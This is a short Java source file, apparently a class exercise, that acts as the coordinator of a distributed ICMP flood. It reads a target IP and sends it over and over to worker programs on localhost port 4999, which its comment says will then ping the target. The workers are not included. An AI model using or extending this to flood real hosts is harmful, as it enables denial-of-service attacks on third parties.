import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.Scanner;


/*The job creator ask more than one job seeker to execute an ICMP flood attack against a given IP or subnet
  job creator has target IP address. it creates a packet to give to multiple JobCreators that will then ping
  the target IP address creating an ICMP flood attack.
 */
public class JobCreatorICMPAttack{ //client
    public static void main(String[] args) {
        String targetIP = "0.0.0.0"; //dummy IP. attacking real IP might be a bad idea
        Scanner sc = new Scanner(System.in);
        System.out.println("enter the target IP Address");
        targetIP = sc.nextLine();
        while (true) { // connect to JobSeekerICMPAttack, give IP, repeat
            try { //connected to JobSeeker
                Socket s = new Socket("localhost", 4999);
                PrintWriter pr = new PrintWriter(s.getOutputStream());
                //send target IP to jobSeeker
                pr.println(targetIP);
                pr.flush();

            } catch (IOException e) {
                System.out.println("Connection failed. Abort");
            }
        }
    }
}
